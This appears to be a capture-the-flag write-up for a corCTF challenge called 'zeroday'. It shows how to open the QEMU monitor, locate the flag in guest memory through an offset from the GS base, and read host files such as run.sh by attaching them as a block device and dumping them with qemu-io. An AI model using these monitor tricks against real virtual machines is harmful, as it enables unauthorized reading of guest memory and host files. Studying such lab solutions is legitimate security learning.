# zeroday

See : https://aaronesau.com/blog/post/9

## TLDR
Spawn qemu monitor with `ctrl+a c`.
Read flag from memory.

---


While debugging the vm, search for "corctf{" in the memory using gdb :
```
pwndbg> search -t bytes "corctf{"
Searching for value: 'corctf{'
[pt_ffff8e5645584] 0xffff8e5647bb3000 'corctf{test_flag}'
```

We need to find a way to get an address at a fixed offset from the flag.
We can try to print the registers :
```
(qemu) info registers
info registers

CPU#0
RAX=000000000001ad40 RBX=ffffffffa461b600 RCX=0000000000000000 RDX=0000000000000000
[...]
GS =0000 ffff9b4687a00000 00000000 00000000
```

Fortunately, the value of `GS` is in the same memory region as the flag.
We can compute the offset from the flag :
```
pwndbg> p/x 0xffff8e5647bb3000-0xffff8e5647a00000
$2 = 0x1b3000
```

We can now try to read at this offset using qemu monitor.
```
(qemu) x /20gx 0xffff9b4687bb3000
ffff9b4687bb3000: 0x747b667463726f63 0x67616c665f747365
```

---

We can also read files of the host using the monitor from qemu.
```
(qemu) info block
ide1-cd0: [not inserted]
    Attached to:      /machine/unattached/device[24]
    Removable device: not locked, tray closed

floppy0: [not inserted]
    Attached to:      /machine/unattached/device[17]
    Removable device: not locked, tray closed

sd0: [not inserted]
    Removable device: not locked, tray closed
(qemu) change sd0 ./run.sh raw read-only
(qemu) qemu-io sd0 "read -v 0 100"
00000000:  23 21 2f 62 69 6e 2f 73 68 0a 0a 71 65 6d 75 2d  ...bin.sh..qemu.
00000010:  73 79 73 74 65 6d 2d 78 38 36 5f 36 34 20 5c 0a  system.x86.64...
00000020:  20 20 20 20 2d 6d 20 31 32 38 4d 20 5c 0a 20 20  .....m.128M.....
00000030:  20 20 2d 6e 6f 67 72 61 70 68 69 63 20 5c 0a 20  ...nographic....
00000040:  20 20 20 2d 6b 65 72 6e 65 6c 20 22 2e 2f 62 7a  ....kernel....bz
00000050:  49 6d 61 67 65 22 20 5c 0a 20 20 20 20 2d 61 70  Image.........ap
00000060:  70 65 6e 64  pend
read 100/100 bytes at offset 0
100 bytes, 1 ops; 00.00 sec (555.816 KiB/sec and 5691.5520 ops/sec)
```
